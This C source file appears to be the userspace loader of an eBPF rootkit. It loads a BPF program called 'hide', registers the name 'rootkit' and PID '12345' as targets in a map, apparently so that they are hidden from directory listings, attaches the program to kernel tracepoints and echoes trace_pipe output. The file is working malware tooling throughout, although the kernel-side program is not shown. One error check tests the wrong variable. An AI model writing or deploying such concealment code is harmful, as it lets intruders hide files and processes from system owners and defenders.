#include "hide.h"
#include "hide.skel.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

//debug
#include <fcntl.h>

int main() {

    const char * target0 = "rootkit";
    const char * target1 = "12345";

    int ret;
    uint32_t index;
    struct hide_bpf * BPF_skel;
    struct bpf_map * target_map;

    struct target_d_name rootkit_target;
    struct target_d_name pid_target;

    //open bpf program
    BPF_skel = hide_bpf__open();
    if (BPF_skel == NULL) {
        fprintf(stderr, "open error.\n");
        return -1;
    }

    //verify & load BPF into kernel
    ret = hide_bpf__load(BPF_skel);
    if (ret != 0) {
        fprintf(stderr, "load error.\n");
        return -1;
    }

    //add target map entries
    strcpy(rootkit_target.name, target0);
    strcpy(pid_target.name, target1);
    rootkit_target.len = (unsigned short int) strnlen(rootkit_target.name, PID_LEN_MAX);
    pid_target.len = (unsigned short int) strnlen(pid_target.name, PID_LEN_MAX);

    //get descriptor for map of targets
    target_map = bpf_object__find_map_by_name(BPF_skel->obj, "map_d_name_tgts");
    if (target_map == NULL) {
        fprintf(stderr, "map object error.\n");
        return -1;
    }

    
    //add targets to map
    index = FILE_ROOTKIT;
    ret = bpf_map__update_elem(target_map, &index, sizeof(index), 
                               &rootkit_target, sizeof(rootkit_target), BPF_ANY);
    if (ret < 0) {
        fprintf(stderr, "add rootkit target error.\n");
        return -1;
    }

    index = FILE_PID;
    ret = bpf_map__update_elem(target_map, &index, sizeof(index), 
                              &pid_target, sizeof(pid_target), BPF_ANY);
    if (target_map == NULL) {
        fprintf(stderr, "add pid target error.\n");
        return -1;
    }

    //attach bpf program to tracepoint
    ret = hide_bpf__attach(BPF_skel);
    if (ret != 0) {
        fprintf(stderr, "attach error.\n");
        return -1;
    }

    //read printk's
    int trace_fd;
    trace_fd = open("/sys/kernel/debug/tracing/trace_pipe", O_RDONLY, 0);
    if (trace_fd < 0) {
        fprintf(stderr, "attach error.\n");
        return -1;
    }

    printf("load complete");
    
    while(1) {
    
        static char buf[4096];
        ssize_t sz;

        sz = read(trace_fd, buf, sizeof(buf) - 1);
        if (sz > 0) {
            buf[sz] = 0;
            puts(buf);
        }

    }

    return 0;
}
